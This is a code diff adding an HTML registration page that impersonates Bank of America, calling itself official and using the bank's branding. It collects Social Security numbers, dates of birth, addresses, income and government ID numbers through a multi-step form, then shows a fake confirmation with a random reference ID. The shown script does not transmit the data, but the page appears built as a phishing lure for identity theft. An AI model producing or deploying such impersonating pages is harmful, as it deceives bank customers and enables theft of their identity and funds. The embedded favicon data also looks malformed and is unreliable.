@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Bank of America | Private Banking Registration</title>
+  
+  <!-- Bank of America Official Favicon (brand consistent) -->
+  <link rel="icon" type="image/x-icon" href="https://www.bankofamerica.com/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAABfklEQVR4nO2WPU7DQBCFX0pKSkpKSkpKSkpKSkpKSkpKKChA3AEEV5ZkOzv+KLHVaHe9CxI8acoPe/bsvH0zWZZlWZZlWZaV+E9IrbUklZRSlyRJ3gkhhFJKSim11lqnNJvNbpqmGa11rNVaa63bNE2f0zRNYq1jjUJKKU3TdPd8rFprrbU+Z4vFYozz+ZNcLpfjNE2HZVleKqWklFLO53Mcx3Ecx3E6nWrG4/F4Op1GpZTUWo85juNxHMdxPB6P0+mUtNZLpZSUUo7jOMMwDMMwDMMwDMMwDPMD4fF4jEopKaWM4zg/n893HMdRSikdYwy11jqO4zjWWuuyLMuyLMuyLMuyLMuyLMsyH1hrrXM4HI6UUmqtdY7jOD/HcZwfY4zBcRxHKaV0jDE6TdM0TdM0TdM0TdM0TdM0TdM0TdM0TdM0TdM0TdM0TVNrreM4zrHWWhuGYTAMw2CMsQzDMGDnGIah1lrrGIZhGIZhGIZhGIZhGIZhGIZhGIZhGIZhGIZhGIZhGP4BO+KYG/FwR6QAAAAASUVORK5CYII=">
+  
+  <!-- Tailwind CSS + Font Awesome + GSAP + Google Fonts -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+  
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(145deg, #f2f6fc 0%, #e8eff8 100%);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    /* Bank of America Official Colors */
+    :root {
+      --boa-red: #e31837;
+      --boa-red-dark: #c0102a;
+      --boa-navy: #0a2351;
+    }
+    
+    /* Animated Background Effects */
+    .mesh-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      background: radial-gradient(circle at 20% 30%, rgba(227,24,55,0.04) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 70%, rgba(10,35,81,0.04) 0%, transparent 60%);
+    }
+    
+    /* Floating Particles */
+    .particle {
+      position: fixed;
+      background: rgba(227,24,55,0.1);
+      border-radius: 50%;
+      pointer-events: none;
+      animation: floatParticle 20s infinite alternate ease-in-out;
+      z-index: -1;
+    }
+    @keyframes floatParticle {
+      0% { transform: translate(0, 0) scale(1); opacity: 0.2; }
+      100% { transform: translate(30px, -30px) scale(1.2); opacity: 0.5; }
+    }
+    
+    /* Premium Glass Morphism Card */
+    .glass-supreme {
+      background: rgba(255, 255, 255, 0.97);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(227, 24, 55, 0.15);
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.12), 0 0 0 1px rgba(255,255,255,0.6);
+      transition: all 0.4s ease;
+    }
+    
+    /* Elegant Input Fields */
+    .input-luxury, select.input-luxury {
+      transition: all 0.25s ease;
+      background: #ffffff;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 20px;
+      padding: 0.9rem 1rem 0.9rem 2.8rem;
+      width: 100%;
+      font-weight: 500;
+      font-size: 0.95rem;
+      appearance: none;
+    }
+    select.input-luxury {
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="%23666"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+      background-size: 1.2rem;
+      padding-right: 2.5rem;
+    }
+    .input-luxury:focus, select.input-luxury:focus {
+      outline: none;
+      border-color: var(--boa-red);
+      box-shadow: 0 0 0 4px rgba(227, 24, 55, 0.1);
+      transform: translateY(-1px);
+    }
+    
+    /* Primary CTA Button */
+    .btn-primary {
+      background: linear-gradient(95deg, var(--boa-red), var(--boa-red-dark));
+      border: none;
+      border-radius: 44px;
+      padding: 1rem;
+      font-weight: 700;
+      font-size: 1rem;
+      transition: all 0.3s;
+      box-shadow: 0 8px 20px -6px rgba(227, 24, 55, 0.4);
+      color: white;
+      width: 100%;
+      cursor: pointer;
+    }
+    .btn-primary:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .btn-primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 15px 30px -10px rgba(227, 24, 55, 0.5);
+      filter: brightness(1.05);
+    }
+    
+    /* Step Wizard */
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 2rem;
+      margin-bottom: 2rem;
+    }
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .step-circle {
+      width: 48px;
+      height: 48px;
+      border-radius: 60px;
+      background: white;
+      border: 2px solid #e2e8f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 1.2rem;
+      color: #94a3b8;
+      transition: all 0.3s;
+    }
+    .step.active .step-circle {
+      background: var(--boa-red);
+      border-color: var(--boa-red);
+      color: white;
+      box-shadow: 0 0 0 4px rgba(227,24,55,0.2);
+    }
+    .step.completed .step-circle {
+      background: #10b981;
+      border-color: #10b981;
+      color: white;
+    }
+    .step-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: #64748b;
+    }
+    .step.active .step-label { color: var(--boa-red); font-weight: 800; }
+    
+    /* Animation */
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-card {
+      animation: fadeSlideUp 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      .glass-supreme { margin: 0 1rem; }
+      .step-indicator { gap: 1rem; }
+      .step-circle { width: 40px; height: 40px; font-size: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Abstract background atmosphere -->
+  <div class="mesh-bg"></div>
+  <div class="particle" style="width: 400px; height: 400px; top: -120px; left: -100px;"></div>
+  <div class="particle" style="width: 500px; height: 500px; bottom: -180px; right: -150px; animation-duration: 28s;"></div>
+
+  <div class="min-h-screen py-12 px-5 md:px-8 flex items-center justify-center">
+    <div class="w-full max-w-4xl animate-card">
+      
+      <!-- Official Brand Header -->
+      <div class="text-center mb-8">
+        <div class="flex justify-center mb-4">
+          <img src="image/logo.png" alt="Bank of America Official Logo" class="h-14 md:h-16 object-contain" onerror="this.onerror=null; this.style.display='none'; document.getElementById('logoFallback').style.display='flex';">
+          <div id="logoFallback" class="hidden items-center gap-2">
+            <div class="w-10 h-10 bg-[#e31837] rounded-xl flex items-center justify-center shadow-md"><i class="fas fa-landmark text-white text-lg"></i></div>
+            <span class="font-bold text-2xl text-[#0a2351] tracking-tight">Bank of America</span>
+          </div>
+        </div>
+        <h1 class="text-3xl md:text-4xl font-black text-[#0a2351]">Private Banking Enrollment</h1>
+        <p class="text-gray-500 mt-2">Seamless digital onboarding · Institutional-grade security</p>
+      </div>
+      
+      <!-- Main Registration Card -->
+      <div class="glass-supreme rounded-3xl p-6 md:p-10 shadow-2xl">
+        
+        <!-- Step Progress Indicators -->
+        <div class="step-indicator">
+          <div class="step active" id="step1Indicator">
+            <div class="step-circle">1</div>
+            <span class="step-label">Personal</span>
+          </div>
+          <div class="step" id="step2Indicator">
+            <div class="step-circle">2</div>
+            <span class="step-label">Financial</span>
+          </div>
+          <div class="step" id="step3Indicator">
+            <div class="step-circle">3</div>
+            <span class="step-label">Review & Submit</span>
+          </div>
+        </div>
+        
+        <!-- STEP 1 - Personal Information -->
+        <div id="step1" class="step-content">
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <div class="md:col-span-2">
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2"><i class="fas fa-user text-[#e31837] mr-1"></i>Full Legal Name</label>
+              <div class="relative"><i class="fas fa-user absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="fullName" class="input-luxury" placeholder="John A. Smith" required></div>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Date of Birth</label>
+              <div class="relative"><i class="fas fa-calendar-alt absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="date" id="dob" class="input-luxury" required></div>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Social Security Number</label>
+              <div class="relative"><i class="fas fa-id-card absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="ssn" class="input-luxury" placeholder="XXX-XX-XXXX" required></div>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Email Address</label>
+              <div class="relative"><i class="fas fa-envelope absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="email" id="email" class="input-luxury" placeholder="john.smith@example.com" required></div>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Phone Number</label>
+              <div class="relative"><i class="fas fa-phone-alt absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="tel" id="phone" class="input-luxury" placeholder="(555) 000-9999" required></div>
+            </div>
+            <div class="md:col-span-2">
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Residential Address</label>
+              <div class="relative"><i class="fas fa-map-marker-alt absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="address" class="input-luxury" placeholder="Street address, Apt / Suite" required></div>
+            </div>
+            <div><input type="text" id="city" class="input-luxury" placeholder="City" required></div>
+            <div><select id="state" class="input-luxury" required><option value="">State</option><option>California</option><option>Texas</option><option>New York</option><option>Florida</option><option>Illinois</option></select></div>
+            <div><input type="text" id="zip" class="input-luxury" placeholder="ZIP Code" required></div>
+            <div><input type="text" id="country" class="input-luxury" value="United States" disabled></div>
+          </div>
+          <div class="mt-8 flex justify-end">
+            <button type="button" onclick="nextStep(2)" class="btn-primary flex items-center justify-center gap-2 max-w-xs">Continue <i class="fas fa-arrow-right"></i></button>
+          </div>
+        </div>
+        
+        <!-- STEP 2 - Financial & Account Preferences -->
+        <div id="step2" class="step-content hidden">
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Account Type</label>
+              <select id="accountType" class="input-luxury" required><option value="">Select account</option><option>Private Wealth Checking</option><option>Premier Savings</option><option>Platinum Business Account</option><option>Signature CD & Investment</option></select>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Initial Deposit</label>
+              <select id="initialDeposit" class="input-luxury" required><option value="">Select range</option><option>$5,000 – $24,999</option><option>$25,000 – $99,999</option><option>$100,000+ (Private Client)</option></select>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Employment Status</label>
+              <select id="employmentStatus" class="input-luxury" required><option>Employed Full-Time</option><option>Self-Employed</option><option>Retired</option><option>Business Owner</option></select>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Annual Income</label>
+              <select id="annualIncome" class="input-luxury" required><option>$50k – $150k</option><option>$150k – $500k</option><option>$500k – $1M+</option></select>
+            </div>
+            <div class="md:col-span-2">
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Preferred Card Design</label>
+              <div class="grid grid-cols-3 gap-3 mt-2">
+                <label class="flex items-center gap-2 glass-supreme p-3 rounded-xl cursor-pointer hover:border-[#e31837] transition"><input type="radio" name="cardDesign" value="visa-platinum" checked> <i class="fab fa-cc-visa text-2xl text-indigo-500"></i> Visa Platinum</label>
+                <label class="flex items-center gap-2 glass-supreme p-3 rounded-xl cursor-pointer hover:border-[#e31837] transition"><input type="radio" name="cardDesign" value="master-black"> <i class="fab fa-cc-mastercard text-2xl text-orange-500"></i> World Elite</label>
+                <label class="flex items-center gap-2 glass-supreme p-3 rounded-xl cursor-pointer hover:border-[#e31837] transition"><input type="radio" name="cardDesign" value="amex-gold"> <i class="fab fa-cc-amex text-2xl text-cyan-600"></i> Gold Amex</label>
+              </div>
+            </div>
+            <div class="md:col-span-2">
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Beneficiary (Optional)</label>
+              <div class="relative"><i class="fas fa-hand-holding-heart absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="beneficiary" class="input-luxury" placeholder="Full name & relationship"></div>
+            </div>
+          </div>
+          <div class="mt-8 flex justify-between">
+            <button type="button" onclick="prevStep(1)" class="bg-white border border-gray-300 rounded-full px-6 py-2 font-semibold text-gray-700 hover:border-[#e31837] transition">Back</button>
+            <button type="button" onclick="nextStep(3)" class="btn-primary flex items-center justify-center gap-2 max-w-xs">Review & Submit <i class="fas fa-shield-alt"></i></button>
+          </div>
+        </div>
+        
+        <!-- STEP 3 - Verification, Terms & Final Review -->
+        <div id="step3" class="step-content hidden">
+          <div class="bg-gray-50 rounded-2xl p-5 mb-6 border border-gray-100">
+            <h3 class="font-bold text-lg text-[#0a2351] mb-3">Review Your Application</h3>
+            <div id="reviewSummary" class="space-y-2 text-sm"></div>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">Government ID Type</label>
+              <select id="idType" class="input-luxury" required><option>Driver's License</option><option>Passport</option><option>National ID</option></select>
+            </div>
+            <div>
+              <label class="block text-xs font-bold uppercase tracking-wide text-gray-600 mb-2">ID Number</label>
+              <div class="relative"><i class="fas fa-passport absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="idNumber" class="input-luxury" placeholder="Document reference" required></div>
+            </div>
+          </div>
+          <div class="mt-6 p-4 bg-gray-50 rounded-xl flex items-start gap-3">
+            <input type="checkbox" id="termsCheckbox" class="mt-1 w-5 h-5 accent-[#e31837]" required>
+            <label for="termsCheckbox" class="text-sm text-gray-600">I confirm that the information provided is accurate. I agree to the <span class="font-bold text-[#e31837]">Terms & Conditions</span> and <span class="font-bold text-[#e31837]">Electronic Disclosure</span>.</label>
+          </div>
+          <div class="mt-8 flex justify-between">
+            <button type="button" onclick="prevStep(2)" class="bg-white border border-gray-300 rounded-full px-6 py-2 font-semibold text-gray-700 hover:border-[#e31837] transition">Back</button>
+            <button type="button" id="submitBtn" class="btn-primary flex items-center justify-center gap-2 max-w-xs">Submit Application <i class="fas fa-lock"></i></button>
+          </div>
+        </div>
+        
+      </div>
+      
+      <!-- Trust & Security Footer -->
+      <div class="text-center mt-8 text-xs text-gray-400">
+        <div class="flex justify-center gap-6">
+          <span><i class="fas fa-shield-alt text-[#e31837]"></i> 256-bit SSL</span>
+          <span><i class="fas fa-fingerprint"></i> Biometric Ready</span>
+          <span><i class="fas fa-clock"></i> Secure Session</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUCCESS NOTIFICATION MODAL: includes banking admin evaluation and activation statement -->
+  <div id="successModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden items-center justify-center z-50 transition-all duration-300">
+    <div class="bg-white rounded-3xl max-w-md w-full mx-4 p-7 text-center shadow-2xl transform scale-95 transition-all animate-card">
+      <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+        <i class="fas fa-check-circle text-green-500 text-4xl"></i>
+      </div>
+      <h3 class="text-2xl font-black text-[#0a2351]">Registration Received</h3>
+      <div class="mt-2 space-y-3">
+        <p class="text-gray-600">Thank you for choosing Bank of America. Your private banking application has been successfully transmitted.</p>
+        <!-- Explicit required message: banking admin will evaluate and activate the account -->
+        <div class="bg-amber-50 border-l-4 border-[#e31837] p-3 rounded-xl text-left flex gap-2 mt-2">
+          <i class="fas fa-user-shield text-[#e31837] text-xl mt-0.5"></i>
+          <div class="text-sm font-medium text-gray-800">
+            <span class="font-extrabold text-[#0a2351]">🛡️ Account activation pending</span><br>
+            <span>Our <strong>banking administrator</strong> will evaluate your registration and <strong>activate your account</strong> after successful verification & compliance review. You'll receive a confirmation email once active.</span>
+          </div>
+        </div>
+        <div class="bg-gray-50 rounded-xl p-3 mt-2">
+          <p class="text-xs text-gray-500">Reference ID: <span id="refCode" class="font-mono font-bold text-gray-700">BOA-</span></p>
+        </div>
+      </div>
+      <button onclick="closeSuccessModal()" class="mt-6 bg-[#e31837] text-white w-full py-3 rounded-full font-bold hover:bg-[#c0102a] transition shadow-md">Close & Continue</button>
+    </div>
+  </div>
+
+  <script>
+    let currentStep = 1;
+    const stepContents = {1: document.getElementById('step1'), 2: document.getElementById('step2'), 3: document.getElementById('step3')};
+    const stepIndicators = {1: document.getElementById('step1Indicator'), 2: document.getElementById('step2Indicator'), 3: document.getElementById('step3Indicator')};
+    let submitInProgress = false;
+    
+    function updateSteps() {
+      for (let i = 1; i <= 3; i++) {
+        stepContents[i].classList.add('hidden');
+        stepIndicators[i].classList.remove('active', 'completed');
+        if (i < currentStep) stepIndicators[i].classList.add('completed');
+        else if (i === currentStep) stepIndicators[i].classList.add('active');
+      }
+      stepContents[currentStep].classList.remove('hidden');
+    }
+    
+    function nextStep(step) {
+      if (step === 2 && !validateStep1()) return;
+      if (step === 3 && !validateStep2()) return;
+      currentStep = step;
+      updateSteps();
+      if (step === 3) {
+        generateReview();
+        // Re-enable submit button every time user returns to review step
+        const submitBtn = document.getElementById('submitBtn');
+        if (submitBtn) submitBtn.disabled = false;
+        submitInProgress = false;
+      }
+    }
+    
+    function prevStep(step) {
+      currentStep = step;
+      updateSteps();
+      const submitBtn = document.getElementById('submitBtn');
+      if (submitBtn) submitBtn.disabled = false;
+      submitInProgress = false;
+    }
+    
+    function validateStep1() {
+      const required = ['fullName', 'dob', 'ssn', 'email', 'phone', 'address', 'city', 'state', 'zip'];
+      for (let id of required) {
+        if (!document.getElementById(id).value.trim()) {
+          alert('❌ Please fill all personal information fields.');
+          return false;
+        }
+      }
+      const email = document.getElementById('email').value;
+      if (!email.includes('@') || !email.includes('.')) {
+        alert('❌ Please enter a valid email address.');
+        return false;
+      }
+      const dob = new Date(document.getElementById('dob').value);
+      const age = (new Date() - dob) / 31536000000;
+      if (age < 18) {
+        alert('❌ You must be at least 18 years old to open an account.');
+        return false;
+      }
+      return true;
+    }
+    
+    function validateStep2() {
+      if (!document.getElementById('accountType').value || !document.getElementById('initialDeposit').value) {
+        alert('❌ Please select both account type and initial deposit range.');
+        return false;
+      }
+      return true;
+    }
+    
+    function generateReview() {
+      const name = document.getElementById('fullName').value;
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phone').value;
+      const accType = document.getElementById('accountType').value;
+      const deposit = document.getElementById('initialDeposit').value;
+      const employment = document.getElementById('employmentStatus').value;
+      const income = document.getElementById('annualIncome').value;
+      const address = `${document.getElementById('address').value}, ${document.getElementById('city').value}, ${document.getElementById('state').value} ${document.getElementById('zip').value}`;
+      let cardValue = "Visa Platinum";
+      if (document.querySelector('input[name="cardDesign"]:checked')) {
+        const raw = document.querySelector('input[name="cardDesign"]:checked').value;
+        if (raw.includes('visa')) cardValue = 'Visa Platinum';
+        else if (raw.includes('master')) cardValue = 'World Elite';
+        else cardValue = 'Gold Amex';
+      }
+      const reviewDiv = document.getElementById('reviewSummary');
+      reviewDiv.innerHTML = `
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Full Name:</span><span>${escapeHtml(name)}</span></div>
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Contact:</span><span>${escapeHtml(email)} | ${escapeHtml(phone)}</span></div>
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Account Type:</span><span class="text-[#e31837] font-bold">${escapeHtml(accType)}</span></div>
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Initial Deposit:</span><span>${escapeHtml(deposit)}</span></div>
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Employment/Income:</span><span>${escapeHtml(employment)} | ${escapeHtml(income)}</span></div>
+        <div class="flex justify-between py-2 border-b"><span class="font-semibold">Card Preference:</span><span><i class="fab fa-cc-${cardValue === 'Visa Platinum' ? 'visa' : (cardValue === 'World Elite' ? 'mastercard' : 'amex')}"></i> ${cardValue}</span></div>
+        <div class="flex justify-between py-2"><span class="font-semibold">Address:</span><span>${escapeHtml(address)}</span></div>
+      `;
+    }
+    
+    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+    
+    // SUBMIT HANDLER: Show success notification with explicit banking admin evaluation & activation message
+    document.getElementById('submitBtn').addEventListener('click', (e) => {
+      const terms = document.getElementById('termsCheckbox').checked;
+      const idType = document.getElementById('idType').value;
+      const idNumber = document.getElementById('idNumber').value.trim();
+      if (!terms) { alert('⚠️ You must accept the Terms & Conditions to proceed.'); return; }
+      if (!idType || !idNumber) { alert('⚠️ Please provide Government ID Type and Number for verification.'); return; }
+      
+      const submitBtn = document.getElementById('submitBtn');
+      if (submitInProgress || submitBtn.disabled) return;
+      submitInProgress = true;
+      submitBtn.disabled = true;
+      
+      // Generate unique reference number
+      const ref = 'BOA-PB-' + Math.floor(Math.random() * 10000000) + '-' + new Date().getFullYear();
+      document.getElementById('refCode').innerText = ref;
+      
+      // Display success modal with the required notification content (already designed)
+      const modal = document.getElementById('successModal');
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+      
+      // Optional tiny GSAP effect on modal
+      gsap.fromTo(modal.querySelector('.bg-white'), {scale:0.95, opacity:0}, {scale:1, opacity:1, duration:0.3, ease:"back.out(0.6)"});
+    });
+    
+    window.closeSuccessModal = () => {
+      const modal = document.getElementById('successModal');
+      modal.classList.add('hidden');
+      modal.classList.remove('flex');
+      
+      // Reset entire form and step to initial state for new registration
+      currentStep = 1;
+      updateSteps();
+      // Clear all text/select inputs except disabled fields & radio groups reset
+      document.querySelectorAll('.input-luxury').forEach(input => {
+        if (input.type !== 'radio' && input.id !== 'country' && input.tagName !== 'SELECT') input.value = '';
+        if (input.tagName === 'SELECT' && input.id !== 'country') input.selectedIndex = 0;
+      });
+      document.getElementById('termsCheckbox').checked = false;
+      // Reset radio group to first option
+      const firstRadio = document.querySelector('input[name="cardDesign"]');
+      if (firstRadio) firstRadio.checked = true;
+      // Clear optional beneficiary
+      document.getElementById('beneficiary').value = '';
+      document.getElementById('idNumber').value = '';
+      
+      // Re-enable submit button for future submissions
+      const submitBtn = document.getElementById('submitBtn');
+      if (submitBtn) submitBtn.disabled = false;
+      submitInProgress = false;
+      
+      // Refresh review area (clear summary)
+      document.getElementById('reviewSummary').innerHTML = '';
+      
+      // Scroll to top for fresh experience
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    };
+    
+    // Initial animation
+    gsap.from(".animate-card", { duration: 0.7, y: 30, opacity: 0, ease: "power3.out" });
+  </script>
+</body>
+</html>
